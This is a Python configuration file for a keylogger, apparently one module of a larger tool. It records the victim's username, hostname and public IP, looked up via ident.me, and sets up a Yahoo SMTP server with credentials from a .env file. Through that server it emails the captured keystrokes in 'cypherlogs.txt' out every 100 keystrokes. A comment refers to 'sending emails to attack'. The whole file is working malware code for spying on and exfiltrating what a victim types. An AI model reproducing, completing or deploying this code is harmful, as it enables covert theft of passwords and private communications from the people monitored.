import os
import sys
import socket
import dotenv
import urllib
from pynput.keyboard import Key
from os.path import basename

'''------------------------------- SCROLL TO BOTTOM FRO CONFIGURATION SETTINGS --------------------------------'''

HOSTNAME = socket.gethostname()
USER = os.getlogin()
FILE_NAME = basename(sys.argv[0].split("\\")[-1])
try:
    PUBLIC_IP = urllib.request.urlopen('https://ident.me').read().decode('utf8')
except:
    PUBLIC_IP = None

# PUBLIC_IP = None                              # to disable sending emails to attack, set PUBLIC_IP to None

if PUBLIC_IP == None:
    SMTP_SERVER = None          
    TO_ADDR = None                   
    FROM_ADDR = None               
    PASSWORD = None 
    EMAIL_INTERVAL = None
    PORT = None

    SUBJECT = None
    CONTENT = None                                
else:
    dotenv.load_dotenv(".env")

    '''------------------------------- CONFIGURATION SETTINGS BELOW --------------------------------'''

    SMTP_SERVER = "smtp.mail.yahoo.com"             # Specify SMTP server here.
    TO_ADDR = os.environ["EMAIL"]                   # Get recipient email address from .env file.
    FROM_ADDR = os.environ["EMAIL"]                 # Get sender email address from .env file.
    PASSWORD = os.environ["PASSWORD"]               # Get email account password from .env file.
    EMAIL_INTERVAL = 100                            # Emails are sent for every X amount of keystrokes. Enter 0 if you do not want periodic emails (Default is 100).
    PORT = 465                                      # Specify port number here(465 reccomended).

    SUBJECT = f"{USER}@{HOSTNAME} // {FILE_NAME}"   # Specify email subject here.
    # Specify email body here.
    CONTENT = '''                                   
    See cypherlogs.txt attached.

    Sent from {}.'''.format(PUBLIC_IP)

EXIT_COMBINATION = {Key.ctrl_l, Key.f12}            # Press [L CTRL] + [F12] to stop keylogger.

